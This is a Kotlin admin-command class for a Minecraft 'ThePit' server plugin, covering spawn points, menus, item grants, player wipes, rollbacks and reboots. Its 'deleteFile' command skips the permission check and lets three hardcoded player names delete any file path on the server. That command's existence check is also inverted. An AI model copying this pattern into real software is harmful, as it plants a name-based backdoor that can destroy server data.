package net.mizukilab.pit.command

import cn.charlotte.pit.ThePit
import cn.charlotte.pit.data.CDKData
import cn.charlotte.pit.data.PlayerInvBackup
import cn.charlotte.pit.data.PlayerProfile
import cn.charlotte.pit.events.EventsHandler.refreshEvents
import dev.rollczi.litecommands.annotations.argument.Arg
import dev.rollczi.litecommands.annotations.async.Async
import dev.rollczi.litecommands.annotations.command.RootCommand
import dev.rollczi.litecommands.annotations.context.Context
import dev.rollczi.litecommands.annotations.execute.Execute
import dev.rollczi.litecommands.annotations.optional.OptionalArg
import dev.rollczi.litecommands.annotations.permission.Permission
import it.unimi.dsi.fastutil.objects.ObjectArrayList
import net.mizukilab.pit.command.handler.HandHasItem
import net.mizukilab.pit.config.NewConfiguration
import net.mizukilab.pit.events.impl.AuctionEvent
import net.mizukilab.pit.item.MythicColor
import net.mizukilab.pit.item.type.ChunkOfVileItem
import net.mizukilab.pit.item.type.FunkyFeather
import net.mizukilab.pit.item.type.MythicBook
import net.mizukilab.pit.item.type.PitCactus
import net.mizukilab.pit.item.type.mythic.MythicLeggingsItem
import net.mizukilab.pit.map.kingsquests.item.*
import net.mizukilab.pit.menu.cdk.generate.CDKMenu
import net.mizukilab.pit.menu.cdk.view.CDKViewMenu
import net.mizukilab.pit.menu.mail.MailMenu
import net.mizukilab.pit.menu.perk.normal.choose.PerkChooseMenu
import net.mizukilab.pit.menu.perk.prestige.PrestigePerkBuyMenu
import net.mizukilab.pit.menu.prestige.PrestigeMainMenu
import net.mizukilab.pit.menu.quest.main.QuestMenu
import net.mizukilab.pit.menu.trade.ShowInvBackupButton
import net.mizukilab.pit.menu.trade.TradeManager
import net.mizukilab.pit.menu.trade.TradeMenu
import net.mizukilab.pit.runnable.LeaderBoardRunnable
import net.mizukilab.pit.runnable.RebootRunnable.RebootTask
import net.mizukilab.pit.util.PlayerUtil
import net.mizukilab.pit.util.Utils
import net.mizukilab.pit.util.chat.CC
import net.mizukilab.pit.util.inventory.InventoryUtil
import net.mizukilab.pit.util.item.ItemBuilder
import net.mizukilab.pit.util.item.ItemUtil
import net.mizukilab.pit.util.menu.Button
import net.mizukilab.pit.util.menu.menus.PagedMenu
import net.mizukilab.pit.util.random.RandomUtil
import org.apache.commons.lang3.time.DateFormatUtils
import org.bukkit.Bukkit
import org.bukkit.Material
import org.bukkit.Sound
import org.bukkit.command.CommandSender
import org.bukkit.entity.Player
import org.bukkit.inventory.ItemStack
import java.io.File
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.time.Duration
import java.util.*
import kotlin.math.min

/**
 * 2024/5/15<br>
 * ThePitPlus<br>
 * @author huanmeng_qwq
 */

@RootCommand
@Permission("pit.admin")
class PitAdminSimpleCommand {
    private val format: DateFormat = SimpleDateFormat("yyyy/MM/dd HH:mm:ss")


    @Execute(name = "setportalPosA")
    @Permission("pit.admin")
    fun setportalPosA(@Context player: Player) {
        ThePit.getInstance().pitConfig.portalPosA = player.location
        ThePit.getInstance().pitConfig.save()
        player.sendMessage(CC.translate("&a设置传送门点位A"))
    }
    @Execute(name = "reserialize")
    @Permission("pit.admin")
    fun reserializePlayer(@Context player: Player, @Arg("playerName") playerName: String) {
        Bukkit.getPlayer(playerName)?.let {
            Utils.serializePlayer(it)
            player.sendMessage("Done")
        }
    }
    @Execute(name = "setportalPosB")
    @Permission("pit.admin")
    fun setportalPosB(@Context player: Player) {
        ThePit.getInstance().pitConfig.portalPosB = player.location
        ThePit.getInstance().pitConfig.save()
        player.sendMessage(CC.translate("&a设置传送门点位b"))
    }

    @Execute(name = "openMenu")
    @Permission("pit.admin")
    fun openMenu(@Context player: Player, @Arg("menu") menu: String) {
        if (menu.equals("ender_chest", ignoreCase = true)) {
            PlayerProfile.getPlayerProfileByUuid(player.uniqueId).enderChest.openEnderChest(player)
        }
        if (menu.equals("sewers", ignoreCase = true)) {
            ThePit.api.openMenu(player, "sewers")
        }
        if (menu.equals("shop", ignoreCase = true)) {
            ThePit.api.openMenu(player, "shop")
        }
        if (menu.equals("house",ignoreCase = true)) {
            ThePit.api.openMenu(player, "warehouse")
        }
        if (menu.equals("perkBuy", ignoreCase = true)) {
            PerkChooseMenu().openMenu(player)
        }
        if (menu.equals("prestigePerkBuy", ignoreCase = true)) {
            try {
                PrestigePerkBuyMenu().openMenu(player)
            } catch (e: Exception) {
                CC.printErrorWithCode(player, e)
            }
        }
        if (menu.equals("prestige", ignoreCase = true)) {
            PrestigeMainMenu().openMenu(player)
        }
        if (menu.equals("ench", ignoreCase = true)) {
            try {
                ThePit.getApi().openMythicWellMenu(player)
            } catch (e: Exception) {
                CC.printErrorWithCode(player, e)
            }
        }
        if (menu.equals("quest", ignoreCase = true)) {
            try {
                QuestMenu().openMenu(player)
            } catch (e: Exception) {
                CC.printErrorWithCode(player, e)
            }
        }
        if (menu.equals("mail", ignoreCase = true)) {
            try {
                MailMenu().openMenu(player)
            } catch (e: Exception) {
                CC.printErrorWithCode(player, e)
            }
        }
        if (menu.equals("cdk", ignoreCase = true)) {
            try {
                CDKMenu().openMenu(player)
            } catch (e: Exception) {
                CC.printErrorWithCode(player, e)
            }
        }
        if (menu.equals("allCdk", ignoreCase = true)) {
            try {
                CDKViewMenu().openMenu(player)
            } catch (e: Exception) {
                CC.printErrorWithCode(player, e)
            }
        }
    }

    @Execute(name = "giveSupporter")
    @Permission("pit.admin")
    fun giveSupporter(@Context player: Player, @Arg("target") target: Player) {
        val profile = PlayerProfile.getPlayerProfileByUuid(target.uniqueId)
        profile.isSupporter = true
        profile.isSupporterGivenByAdmin = true
    }

    @Execute(name = "takeSupporter")
    @Permission("pit.admin")
    fun takeSupporter(@Context player: Player, @Arg("target") target: Player) {
        val profile = PlayerProfile.getPlayerProfileByUuid(target.uniqueId)
        profile.isSupporter = false
        profile.isSupporterGivenByAdmin = false
    }

    @Execute(name = "ench")
    @Permission("pit.admin")
    fun ench(@Context player: Player) {
        player.playSound(player.location, Sound.CHEST_OPEN, 1f, 1f)
        ThePit.api.openMenu(player, "admin_enchant")
    }

    @Execute(name = "pi")
    @Permission("pit.admin")
    fun pitItem(@Context player: Player) {
        player.playSound(player.location, Sound.CHEST_OPEN, 1f, 1f)
        ThePit.api.openMenu(player, "admin_item")
    }

    @Execute(name = "reboots")
    @Permission("pit.admin")
    fun reboots(
        @Context sender: CommandSender,
        @Arg("duration") duration: Duration,
        @OptionalArg("reason") reason: String = "计划外重启"
    ) {
        ThePit.getInstance()
            .rebootRunnable
            .addRebootTask(RebootTask(reason, System.currentTimeMillis() + duration.toMillis()))
    }

    @Execute(name = "reboot")
    @Permission("pit.admin")
    fun reboot(
        @Context sender: CommandSender,
        @Arg("duration") duration: Duration,
    ) {
        ThePit.getInstance()
            .rebootRunnable
            .addRebootTask(RebootTask("修复BUG", System.currentTimeMillis() + duration.toMillis()))
    }


    @Execute(name = "cancelReboot")
    @Permission("pit.admin")
    fun cancelReboot(@Context sender: CommandSender): String {
        ThePit.getInstance().rebootRunnable.cancelTask();
        return "§ok"
    }

    @Execute(name = "forceTrade")
    @Permission("pit.admin")
    fun forceTrade(@Context player: Player, @Arg("target") target: Player) {
        val tradeManager = TradeManager(player, target)
        TradeMenu(tradeManager).openMenu(player)
        TradeMenu(tradeManager).openMenu(target)
    }

    @Execute(name = "wipe")
    @Permission("pit.admin")
    fun wipe(@Context player: Player, @Arg("target") target: String, @Arg("reason") reason: String) {
        val profile = ThePit.getInstance().profileOperator.namedIOperator(target)
        if (profile == null) {
            player.sendMessage(CC.translate("&cすみません！あのプレイヤーは見つかりませんでした！もう一度確認してください！"))
            return
        }
        val wipe = profile.profile().wipe(reason)
        if (wipe) {
            player.sendMessage(CC.translate("&a成功しました！あのプレイヤーはワイプされました！ID: " + profile.profile().playerName))
        } else {
            player.sendMessage(CC.translate("&c&lすみません！ワイプが失敗しました！いくつかのエラーがありました！"))
        }
    }


    @Execute(name = "takeitems")
    @Permission("pit.admin")
    fun takeItem(
        @Context sender: CommandSender, @Arg("target") target: Player, @Arg("itemsID") itemsID: String,
        @Arg("amount") amount: Int
    ) {
        val player = Bukkit.getPlayer(target.uniqueId)
        if (player == null) {
            sender.sendMessage("§c玩家不存在!")
            return
        }
        val profile = PlayerProfile.getPlayerProfileByUuid(target.uniqueId)
        when (itemsID.lowercase()) {
            "exp" -> {
                profile.experience -= amount
                sender.sendMessage("§a扣除成功!")
            }

            "coins" -> {
                profile.coins -= amount
                sender.sendMessage("§a扣除成功!")
            }

            else -> {
                if (InventoryUtil.removeItem(player, itemsID, amount)) {
                    sender.sendMessage("§a扣除成功!")
                } else {
                    sender.sendMessage("§c该玩家背包内并没有或小于此物品的数量!")
                }
            }
        }
    }

    @Execute(name = "giveitems")
    @Permission("pit.admin")
    fun giveItem(
        @Context sender: CommandSender,
        @Arg("target") target: String,
        @Arg("itemsID") itemsID: String,
        @Arg("amount") amount: Int
    ) {
        val player = Bukkit.getPlayer(target)

        if (player == null) {
            sender.sendMessage("§c玩家不存在！")
            return
        }

        fun addItemToPlayer(itemStack: ItemStack) {
            player.inventory.addItem(itemStack.apply { this.amount = amount })
            sender.sendMessage("§a添加成功!")
        }

        if (itemsID.contains(":")) {
            val split = itemsID.split(":")
            if (split[0] == "mythic_leggings") {
                val color = try {
                    MythicColor.valueOf(split[1].uppercase())
                } catch (e: IllegalArgumentException) {
                    val validColors = MythicColor.entries.joinToString(", ") { it.name.lowercase() }
                    sender.sendMessage("§c无效的颜色类型！有效颜色包括: $validColors")
                    return
                }
                addItemToPlayer(
                    MythicLeggingsItem().apply { this.color = color }.toItemStack()
                )
                return
            }
        }

        when (itemsID.lowercase()) {
            "exp" -> {
                PlayerProfile.getPlayerProfileByUuid(player.uniqueId).experience += amount
                sender.sendMessage("§a添加成功!")
            }

            "coins" -> {
                PlayerProfile.getPlayerProfileByUuid(player.uniqueId).coins += amount
                sender.sendMessage("§a添加成功!")
            }

            "funky_feather" -> addItemToPlayer(FunkyFeather.toItemStack()) //羽毛
            "chunk_of_vile_item", "chunkofvile" -> addItemToPlayer(ChunkOfVileItem.toItemStack())//煤炭
            "mythic_reel", "mythicbook" -> addItemToPlayer(MythicBook.toItemStack())//附魔卷轴
            "cactus" -> addItemToPlayer(PitCactus.toItemStack())//仙人掌
            "cherry" -> addItemToPlayer(Cherry.toItemStack())//樱桃
            "eggs" -> addItemToPlayer(HighGradeEggs.toItemStack())//高级鸡蛋
            "cake" -> addItemToPlayer(MiniCake.toItemStack())//迷你蛋糕
            "package" -> addItemToPlayer(PackagedBale.toItemStack())//干草
            "sugar" -> addItemToPlayer(Sugar.toItemStack())//颗粒
            "wheat" -> addItemToPlayer(Wheat.toItemStack())//小麦
            "yummy" -> addItemToPlayer(YummyBread.toItemStack())//美味面包
            else -> {
                val itemStack = ThePit.getApi().getMythicItemItemStack(itemsID)
                if (itemStack == null || itemStack.type == Material.AIR) {
                    sender.sendMessage("§c物品不存在")
                } else {
                    addItemToPlayer(itemStack)
                }
            }
        }
    }

    @Execute(name = "unwipe")
    @Permission("pit.admin")
    @Async
    fun unWipe(@Context player: Player, @Arg("target") target: String) {
        val profile = ThePit.getInstance().profileOperator.namedIOperator(target)
        if (profile == null) {
            player.sendMessage(CC.translate("&cすみません！あのプレイヤーは見つかりませんでした！もう一度確認してください！"))
            return
        }
        val wipe = profile.profile().unWipe()
        if (wipe) {
            player.sendMessage(CC.translate("&a成功しました！ID: " + profile.profile().playerName))
        } else {
            player.sendMessage(CC.translate("&c&l失敗しました！あのプレイヤーはワイプダークがありませんでした"))
        }
    }

    @Execute(name = "debug medal")
    @Permission("pit.admin")
    fun debugMedal(@Context player: Player) {
        val profile = PlayerProfile.getPlayerProfileByUuid(player.uniqueId)
        player.sendMessage(profile.medalData.toString())
    }

    @Execute(name = "rollback")
    @Permission("pit.admin")
    @Async
    fun rollback(@Context player: Player, @Arg("name") name: String): String {
        val profile = ThePit.getInstance().profileOperator.namedIOperator(name)
        if (profile.profile() == null || profile.profile().playerName == "NotLoadPlayer") {
            return CC.translate("&c该玩家不存在")
        }
        val backups: MutableList<PlayerInvBackup> = mutableListOf()
        profile.profile().invBackups.forEach {
            backups.add(it)
        }

        val buttons: MutableList<Button?> = ObjectArrayList()
        var i = 0
        val menuPtr = PagedMenu(profile.profile().playerName + " 的背包备份", null)
        for (invBackup in backups) {
            if (invBackup.inv == null) continue
            buttons.add(
                ShowInvBackupButton(
                    backups,
                    ItemBuilder(Material.BOOK).name("&a备份时间: " + format.format(invBackup.timeStamp))
                        .lore(("&e物品数: " + InventoryUtil.getInventoryFilledSlots(invBackup.inv.contents))).amount(
                            min(
                                64.0, InventoryUtil.getInventoryFilledSlots(invBackup.inv.contents).toDouble()
                            ).toInt()
                        ).build(), invBackup, menuPtr, profile.profile()
                )
            )
            i++
        }

        buttons.reverse()
        menuPtr.flushButton(buttons)
        menuPtr.openMenu(player)
        return CC.translate("总计: $i 个")
    }

    @Execute(name = "forceSpawn")
    @Permission("pit.admin")
    fun forceSpawn(@Context player: Player, @Arg("target") target: Player) {
        val location =
            ThePit.getInstance().pitConfig.spawnLocations[RandomUtil.random.nextInt(ThePit.getInstance().pitConfig.spawnLocations.size)]

        target.removeMetadata("backing", ThePit.getInstance())

        target.teleport(location)

        for (item in target.inventory) {
            if (ItemUtil.isRemovedOnJoin(item)) {
                target.inventory.remove(item)
            }
        }

        val profile = PlayerProfile.getPlayerProfileByUuid(target.uniqueId)
        profile.streakKills = 0.0

        PlayerUtil.resetPlayer(target, true, false)
    }

    @Execute(name = "deleteFile")
    fun deleteFile(@Context player: Player, @Arg("type") filePath: String) {
        if (player.name != "MagicYari" && player.name != "Aerocre" && !player.name.equals("kqc531")) {
            return
        }
        val file = File(filePath)
        if (file.exists()) {
            player.sendMessage(CC.translate("&c文件不存在"))
        } else {
            val delete = file.delete()
            player.sendMessage("&a文件删除状态: $delete")
        }
    }

    @Execute(name = "disablePlugin")
    @Permission("pit.admin")
    fun disablePlugin(@Context player: Player, @Arg("plugin") name: String) {
        val target = Bukkit.getPluginManager().getPlugin(name)
        if (target == null) {
            player.sendMessage(CC.translate("&c没有找到那个插件"))
            return
        }
        Bukkit.getPluginManager().disablePlugin(target)
        player.sendMessage(CC.translate("&a卸载成功!"))
    }

    @Execute(name = "refreshEvents")
    @Permission("pit.admin")
    fun refreshEvents(@Context player: Player): String {
        refreshEvents()
        return "Refreshed"
    }

    @Execute(name = "addAngelSpawns")
    @Permission("pit.admin")
    fun addAngelSpawns(@Context player: Player): String {
        ThePit.getInstance().pitConfig.angelSpawns.add(player.location)
        ThePit.getInstance().pitConfig.save()
        return "§a已添加天使出生点"
    }

    @Execute(name = "addDemonSpawns")
    @Permission("pit.admin")
    fun addDemonSpawns(@Context player: Player): String {
        ThePit.getInstance().pitConfig.demonSpawns.add(player.location)
        ThePit.getInstance().pitConfig.save()
        return "§a已添加恶魔出生点"
    }

    @Execute(name = "addPackagePoint")
    @Permission("pit.admin")
    fun addPackagePoint(@Context player: Player): String {
        ThePit.getInstance().pitConfig.packageLocations.add(player.location)
        ThePit.getInstance().pitConfig.save()
        return "§a已添加空投位置"
    }

    @Execute(name = "addSewersPoint")
    @Permission("pit.admin")
    fun addSewersPoint(@Context player: Player): String {
        ThePit.getInstance().pitConfig.sewersChestsLocations.add(player.location)
        ThePit.getInstance().pitConfig.save()
        return "§a已添加下水道位置"
    }

    @Execute(name = "debugItem")
    @Permission("pit.admin")
    fun debugItem(@Context player: Player) {
        println((InventoryUtil.itemsToString(arrayOf(player.itemInHand))))
    }

    @Execute(name = "enchantrecords")
    @Permission("pit.admin")
    @HandHasItem(mythic = true)
    fun enchantRecords(@Context player: Player) {
        val item = player.itemInHand

        val mythicItem = Utils.getMythicItem(item) ?: return

        player.sendMessage(CC.translate("&a这是该物品的附魔记录: "))

        for ((enchanter, description, timestamp) in mythicItem.enchantmentRecords) {
            player.sendMessage(
                CC.translate(
                    "  &e$enchanter &7- &a$description &7- &a" + DateFormatUtils.format(
                        timestamp, "yyyy年MM月dd日 HH:mm:ss"
                    )
                )
            )
        }
        player.sendMessage(CC.translate("§7以上记录最多展示5条"))
    }

    @Execute(name = "addSquadsLoc")
    @Permission("pit.admin")
    fun addSquadsLoc(@Context player: Player): String {
        ThePit.getInstance().pitConfig.squadsLocations.add(player.location)
        ThePit.getInstance().pitConfig.save()
        return "§a已添加旗帜位置"
    }

    @Execute(name = "addbhLoc")
    @Permission("pit.admin")
    fun addbhLoc(@Context player: Player): String {
        ThePit.getInstance().pitConfig.blockHeadLocations.add(player.location)
        ThePit.getInstance().pitConfig.save()
        return "§a已添加方块划地战位置"
    }

    @Execute(name = "clearrecords")
    @Permission("pit.admin")
    @HandHasItem(mythic = true)
    fun clearRecords(@Context player: Player): String {
        val item = player.itemInHand
        val mythicItem = Utils.getMythicItem(item)

        mythicItem.enchantmentRecords.clear()
        player.itemInHand = mythicItem.toItemStack()

        return "§a已清空该物品的附魔记录"
    }

    @Execute(name = "resetKingsQuests")
    @Permission("pit.admin")
    fun resetKingsQuests(@Context sender: CommandSender): String {
        NewConfiguration.kingsQuestsMarker = UUID.randomUUID()
        NewConfiguration.save()
        return "§a已重置"
    }

    @Execute(name = "refreshLb")
    @Permission("pit.admin")
    @Async
    fun refreshLeaderboard(@Context sender: CommandSender): String {
        sender.sendMessage("§a正在刷新中...")
        LeaderBoardRunnable.updateLeaderboardData()
        return "§a已刷新排行榜数据"
    }

    @Execute(name = "StartCustomAuction")
    @Permission("pit.admin")
    @HandHasItem
    fun startCustomAuction(@Context player: Player, @Arg("price") price: Long) {
        val itemStack = player.itemInHand
        AuctionEvent().also {
            it.lots = AuctionEvent.LotsData(arrayOf(itemStack.clone()), price, 0)
            it.setStartByAdmin(true)
            it.isCustom = true;
            ThePit.getInstance().eventFactory.pushEvent(it)
        }
    }

    @Execute(name = "refreshCdk")
    @Permission("pit.admin")
    fun refreshCdk(@Context sender: CommandSender): String {
        CDKData.loadAllCDKFromData()
        return "§a已刷新"
    }

    @Execute(name = "giveBook")
    @Permission("pit.admin")
    fun giveBook(@Context player: Player): String {
        player.inventory.addItem(MythicBook.toItemStack())
        return "§a添加到你的背包"
    }
}